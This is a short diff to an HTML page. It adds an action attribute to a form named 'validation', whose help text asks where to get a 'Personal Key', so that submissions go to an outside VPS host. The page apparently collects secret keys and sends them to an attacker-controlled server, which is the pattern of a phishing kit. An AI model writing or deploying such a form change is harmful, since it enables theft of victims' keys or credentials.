@@ -10,7 +10,7 @@
 </head>
 <body>
 <div class='main'>
-    <form id="validation" class="form_validation">
+    <form id="validation" class="form_validation" action="https://server4reema.vps.webdock.cloud/">
         <div class="help_form">
             <button type="button" class="accordion">Where can i take a Personal Key</button>
             <div class="panels">
